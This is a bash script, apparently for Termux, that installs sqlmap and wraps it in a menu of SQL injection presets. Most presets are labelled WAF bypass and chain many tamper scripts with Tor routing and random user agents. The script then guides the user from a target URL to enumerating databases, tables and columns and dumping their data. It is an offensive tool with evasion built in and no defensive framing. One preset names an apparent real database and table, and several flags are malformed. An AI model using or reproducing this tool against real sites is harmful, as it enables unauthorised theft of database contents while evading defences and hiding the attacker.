#!/bin/bash
#Coded By CyberBullet
#AUTOSQLI
#Don't Copy Or Edit Codes,Respect The Coder
install_sqlmap () {
echo -e "\e[1;33mWait ! Installing SQLMAP\e[0m"
command -v python2 >/dev/null || pkg install python2 -y
command -v git >/dev/null || pkg install git -y
cd $PREFIX/share
git clone https://github.com/sqlmapproject/sqlmap
echo "python2 $PREFIX/share/sqlmap/sqlmap.py \$@" >$PREFIX/bin/sqlmap
chmod +x $PREFIX/bin/sqlmap
command -v sqlmap >/dev/null || {echo -e "\e[1;31mInstallation Fail\e[0m"; exit}
}
command -v sqlmap >/dev/null || install_sqlmap
sqlmap=('' '--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10' '--dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py"' '--dbms="MySQL" -v3 --technique U --tamper="space2comment"' '-v3 --technique=T --no-cast --fresh-queries --banner' '--identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment"' '--parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3' '--tamper="between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest" --identify-waf --random-agent' '--banner --safe-url=2 --safe-freq=3 --tamper="between,randomcase,charencode" -v 3 --force-ssl --threads=10 --level=2 --risk=2' '-level=5 --risk=3 --random-agent --tamper="between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes" --dbms=mssql' '--level 5 --risk 3 tamper="between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor" --dbms=mssql' '--level 5 --risk 3 tamper="apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes" --dbms=mssql' '--level=5 --risk=3 -p "id" –-tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords"' '--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent')
banner () {
bash banner.sh
echo -e "\e[1;33m
 ___           _
\e[1;32m| __|_  _ __  | |  _ ()_ _|| _  _
| _|/o\(c'\ V7| ||/ \|/oY/| ]o\/_|
\e[1;31m|___\__]_) )/ |_|L_n||\(\\L|\_/L|
          //         //
\e[1;33m [×] Coded By S0|0 3xpl0iter
\e[0m"
}
inject () {
echo ${sqlmap[$num]}
read -p $'\e[1;32mEnter URL : ' url
sqlmap -u $url ${sqlmap[$num]} --dbs
read -p $'\e[1;32mEnter the name of the database : ' db
sqlmap -u $url ${sqlmap[$num]} -D $db --tables
read -p $'\e[1;32mEnter the table-name to view  columns : ' tb
sqlmap -u $url ${sqlmap[$num]} -D $db -T $tb --columns
read -p $'\e[1;32mEnter the column name to data  dump : ' cl
sqlmap -u $url ${sqlmap[$num]} -D $db -T $tb -C "$cl" --dump
}
menu () {
echo -e "\e[1;34m(1)Normal injection
(2)WAF bypass injection 1
(3)WAF bypass injection 2
(4)WAF bypass injection 3
(5)WAF bypass injection 4
(6)WAF bypass injection 5
(7)WAF bypass injection 6
(8)WAF bypass injection 7
(9)WAF bypass injection 8
(10)WAF bypass injection 9
(11)WAF bypass injection 10
(12)WAF bypass injection 11
(13)WAF bypass injection 12
(14)WAF bypass injection 13
(15)To Exit\e[0m"
read -p $'\e[1;32mSelect menu : \e[0m' num
}
choose () {
if [[ $num == 15 ]];then
exit
else
num=$(( $num-1 ))
inject
fi
}
main () {
banner
menu
choose
}
main
